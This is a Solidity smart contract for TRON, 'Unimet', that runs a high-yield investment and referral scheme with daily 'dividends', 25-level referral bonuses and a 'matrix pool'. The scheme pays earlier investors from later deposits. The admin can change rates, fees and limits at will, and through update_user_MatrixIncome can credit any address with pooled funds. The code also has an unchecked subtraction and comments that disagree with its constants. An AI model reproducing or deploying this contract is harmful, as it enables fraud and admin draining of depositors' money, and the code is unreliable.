//SourceUnit: Unimet.sol

pragma solidity ^0.5.10;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Unimet {
	using SafeMath for uint256;
	using SafeMath for uint8;

	
	uint256 constant public INCREASE_DEPOSIT_LIMIT = 50000 trx;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public TIME_STEP =  1 days;

	uint256 constant public MATRIX_POOL_UNIT = 5e8;

	uint256 public MIN_WITHDRAW = 500 trx;
	uint256 public INVEST_MIN_AMOUNT = 500 trx;
	uint256 public BASE_PERCENT = 66; // 0.66 %
	uint256 public directCommission = 700; 
	uint256 public maxWithDrawInADay = 15000 trx;
	uint256 public next_deposit = 1000;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint[] public ref_bonuses = [15,5,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,5,5,5]; 
	uint256 public MatrixPoolDeposit;
	uint8 public magnitude = 30;
	uint8 public feesPercentage = 10;


	address payable public admin;

	address[] public leaders;

	uint256 public fees;

	

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		bool end;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 bonus;
		uint256 match_bonus;
		uint256 totalWithdrawn;
		uint256 WithdrawnInADay;
		uint256 remainingWithdrawn;
		uint8 totalReferrer;
		uint[25] refs;
		uint8 leader_allocation;
		uint256 MatrixIncome;
		uint256 MatrixIncomeWithdrawn;
	}

	mapping (address => User) public users;
	mapping(address => mapping(uint256=>address)) public downline;

	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event WithdrawMatrix(address indexed user, uint256 amount);

	constructor(address payable adminAddr) public {
		require(!isContract(adminAddr));
		admin = adminAddr;
	}


	function _refPayout(address _addr, uint256 _amount) private {
		 address up = users[_addr].referrer;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].refs[0] >= i+1){

					(uint256 to_payout, uint256 max_payout) = this.payoutOf(up);
					
					uint256 bonus = _amount.mul(ref_bonuses[i]).div(100);
					uint remain = (max_payout - users[up].totalWithdrawn.add(to_payout));

					bonus = ( remain > 0 ) ? (remain > bonus) ? bonus : remain : 0;

                users[up].match_bonus += bonus;
			}
            up = users[up].referrer;
        }
    }

	function _refDirectPayout(address _addr, uint256 _amount) internal {
		 address up = users[_addr].referrer;

		 (uint256 to_payout, uint256 max_payout) = this.payoutOf(up);
		 uint256 bonus = _amount.mul(directCommission).div(PERCENTS_DIVIDER); 
		 uint remain = (max_payout - users[up].totalWithdrawn.add(to_payout));

		 bonus = ( remain > 0 ) ? (remain > bonus) ? bonus : remain : 0;

		 if (bonus > 0) {
				users[up].match_bonus = users[up].match_bonus.add(bonus);
			}

	}

	function invest(address referrer) public payable {


		
		require(!isContract(msg.sender) && msg.sender == tx.origin);
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].deposits.length > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");

		if(user.deposits.length > 0){
		 uint previousDeposit = user.deposits[user.deposits.length-1].amount;

		 if(previousDeposit <= INCREASE_DEPOSIT_LIMIT)
		 require(msg.value >= previousDeposit.add(previousDeposit.mul(next_deposit).div(PERCENTS_DIVIDER)) , "Invalid Deposit!");
		}

		// setup upline

		if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refs[i]++;
					users[upline].totalReferrer++;
                    upline = users[upline].referrer;
                } else break;
            }
			
			downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
			
        }



		uint msgValue = msg.value;
		uint ceil = percent(msgValue,MATRIX_POOL_UNIT,0);
		MatrixPoolDeposit = MatrixPoolDeposit.add(ceil.mul(100).mul(1e6));
		msgValue = msgValue.sub(ceil.mul(100).mul(1e6));

		_refDirectPayout(msg.sender,msgValue);

		//////////// adding fee ///////////////////
		
		fees = fees.add(msgValue.mul(feesPercentage).div(100));

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
		}

		user.deposits.push(Deposit(msgValue, 0, block.timestamp,false));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		
		emit NewDeposit(msg.sender, msg.value);

	}

	function withdrawFromMatrix() external{

		User storage user = users[msg.sender];
		uint256 amount =  users[msg.sender].MatrixIncome;
		require(amount > 0, "No payout");
		require(amount <= MatrixPoolDeposit, "insufficient Pool Balance!");
		MatrixPoolDeposit = MatrixPoolDeposit.sub(amount);
		user.MatrixIncome = 0;
		user.MatrixIncomeWithdrawn = user.MatrixIncomeWithdrawn.add(amount);
		msg.sender.transfer(amount);

		emit WithdrawMatrix(msg.sender, amount);

	}

	function withdraw() public {

		
		(uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
		require(to_payout > 0, "User has no dividends");
		require(to_payout >= MIN_WITHDRAW, "Minimum withdraw!");


		User storage user = users[msg.sender];
		uint256 currentTime = block.timestamp;
		if(currentTime.sub(user.checkpoint) >= TIME_STEP){
			user.WithdrawnInADay = 0;
		}

		
		require(user.WithdrawnInADay < maxWithDrawInADay, "Maximum withdraw limit over!");
		

		uint256 userPercentRate = BASE_PERCENT;

		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

				if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(magnitude).div(10)) {

					if (user.deposits[i].start > user.checkpoint) {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.deposits[i].start))
							.div(TIME_STEP);

					} else {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.checkpoint))
							.div(TIME_STEP);

					}

					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(magnitude).div(10)) {     // Deposited Amount × 22 ÷ 10    // = Deposited Amount × 2.2
						dividends = (user.deposits[i].amount.mul(magnitude).div(10)).sub(user.deposits[i].withdrawn);     // Deposited Amount × 2.2 Times Return
					}                                                                                              // Total Return = 220%

					user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);    // changing of storage data after withdrawal
					totalAmount = totalAmount.add(dividends);

					if(user.totalWithdrawn.add(to_payout) >= max_payout){
						user.deposits[i].withdrawn = user.deposits[i].amount.mul(magnitude).div(10);
					}

				}
			
		}


        if(totalAmount > 0){
		_refPayout(msg.sender,totalAmount);
		}


		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
		}

		uint256 referralMatchingBonus = getUserReferralMatchingBonus(msg.sender);
		if (referralMatchingBonus > 0) {
			user.match_bonus = 0;
		}

		if(user.WithdrawnInADay.add(to_payout) > maxWithDrawInADay){

			uint current_payout = to_payout;
			to_payout = maxWithDrawInADay.sub(user.WithdrawnInADay);
			user.remainingWithdrawn = current_payout.sub(to_payout);

		}else{

			user.remainingWithdrawn = 0;
		}


		user.checkpoint = block.timestamp;

		
		uint ceil = percent(to_payout,MATRIX_POOL_UNIT,0);
		uint calculateAmount = MATRIX_POOL_UNIT.mul(ceil);
		user.remainingWithdrawn = to_payout.sub(calculateAmount);
		
		MatrixPoolDeposit = MatrixPoolDeposit.add(ceil.mul(1e8));

		msg.sender.transfer(calculateAmount.sub(ceil.mul(1e8)));

		user.WithdrawnInADay = user.WithdrawnInADay.add(calculateAmount);
		user.totalWithdrawn = user.totalWithdrawn.add(calculateAmount);
		totalWithdrawn = totalWithdrawn.add(calculateAmount);

		emit Withdrawn(msg.sender, calculateAmount);

	}



	function updateMaxWithdrawInADay(uint256 _amount) external {
		require(msg.sender == admin, 'permission denied!');
		maxWithDrawInADay =_amount;
    }

	function updateRef_bonuses(uint8 _index, uint8 _per) external {
		require(msg.sender == admin, 'permission denied!');
		ref_bonuses[_index] =_per;
    }

	function update_base(uint256 _per) external{

		require(msg.sender == admin, 'permission denied!');
		BASE_PERCENT = _per;
	}

	function update_invest(uint256 _amount) external {

		require(msg.sender == admin, 'permission denied!');
		INVEST_MIN_AMOUNT = _amount;
	}

	function update_min_withdraw(uint256 _amount) external{

		require(msg.sender == admin, 'permission denied!');
		MIN_WITHDRAW = _amount;
	}

	function update_next_deposit(uint256 _per) external{

		require(msg.sender == admin, 'permission denied!');
		next_deposit = _per;
	}

	function update_magnitude(uint8 _number) external{

		require(msg.sender == admin, 'permission denied!');
		magnitude = _number;
	}

	function update_fees_Percentage(uint8 _per) external{

		require(msg.sender == admin, 'permission denied!');
		feesPercentage = _per;
	}



	function update_user_MatrixIncome(address _user, uint256 _amount) external returns(bool){
		User storage user = users[_user];
		require(msg.sender == admin, 'permission denied!');
		require(_amount >= user.MatrixIncome.add(user.MatrixIncomeWithdrawn), 'wrong amount');
		
		user.MatrixIncome = _amount.sub(user.MatrixIncomeWithdrawn);
		return true;
	}

	
	
	function isleader(address _leaderAddress) public view returns(bool, uint256)
	{
		for (uint256 s = 0; s < leaders.length; s += 1){
			if (_leaderAddress == leaders[s]) return (true, s);
		}
		return (false, 0);
	}


	function addleader(address _leaderAddress, uint8 _per) external returns(bool) {

		uint Allocated = GetTotalAllocated();
		require(msg.sender == admin, 'permission denied!');
		require(Allocated.add(_per) <= 100, 'No more allocation!'); 
		(bool _isleader,) = isleader(_leaderAddress);
		if(!_isleader) {
			leaders.push(_leaderAddress);
			users[_leaderAddress].leader_allocation = _per;
		}
		return !_isleader;
	}

	function removeleader(address _leaderAddress) external returns(bool) {
		require(msg.sender == admin, 'permission denied!');
		(bool _isleader, uint256 s) = isleader(_leaderAddress);
		if(_isleader){
			users[_leaderAddress].leader_allocation = 0;
			leaders[s] = leaders[leaders.length - 1];
			leaders.pop();
		}

		return _isleader;
	}

	function commision_distribute() external{

		require(msg.sender == admin, 'permission denied!');
		require(leaders.length > 0, 'No leader found');

		uint256 collected_fees = fees;
		for(uint8 i =0;  i < leaders.length; i++){
				  uint256 feesAmount = collected_fees.mul(users[leaders[i]].leader_allocation).div(100);
				  address payable leader = address(uint160(leaders[i]));
				  leader.transfer(feesAmount);
				  fees = fees.sub(feesAmount);
		}
		
	}


	function GetTotalAllocated() public view returns(uint){

		uint Allocated;
		for(uint8 i =0; i < leaders.length; i++){
			Allocated = Allocated.add(users[leaders[i]].leader_allocation);
		}

		return Allocated;
	}

	
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw,  uint _contractPercent) {
        return (totalUsers, totalInvested, totalWithdrawn, BASE_PERCENT);
    }


	

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate = BASE_PERCENT;

		uint256 totalDividends;
		uint256 dividends;



		for (uint256 i = 0; i < user.deposits.length; i++) {

				if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(magnitude).div(10)) {

					if (user.deposits[i].start > user.checkpoint) {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.deposits[i].start))
							.div(TIME_STEP);

					} else {

						dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
							.mul(block.timestamp.sub(user.checkpoint))
							.div(TIME_STEP);

					}

					if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(magnitude).div(10)) {
						dividends = (user.deposits[i].amount.mul(magnitude).div(10)).sub(user.deposits[i].withdrawn);
					}

					totalDividends = totalDividends.add(dividends);


				}
			
		}

		return totalDividends;
	}


	

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineInfo(address userAddress, uint index) public view returns(uint256) {
		return users[userAddress].refs[index];
	}

	
    function maxPayoutOf(address userAddress) view external returns(uint256) {
		User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}
        return amount * magnitude / 10;
    }

	function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
		User storage user = users[_addr];
        max_payout = this.maxPayoutOf(_addr);


		if(user.totalWithdrawn < max_payout){
			payout = getUserDividends(_addr).add(getUserReferralBonus(_addr)).add(getUserReferralMatchingBonus(_addr)).add(user.remainingWithdrawn);

			if(user.totalWithdrawn.add(payout) > max_payout){
				payout = max_payout.sub(user.totalWithdrawn);
			}
		}

    }

	

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralMatchingBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].match_bonus;
	}

	


	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(25).div(10)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function percent(uint numerator, uint denominator, uint precision) internal pure returns(uint quotient) {

            // caution, check safe-to-multiply here
            uint _numerator  = numerator * 10 ** (precision+1);
            // with rounding of last digit
            uint _quotient =  ((_numerator / denominator) + 0) / 10;
            return ( _quotient);
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	
}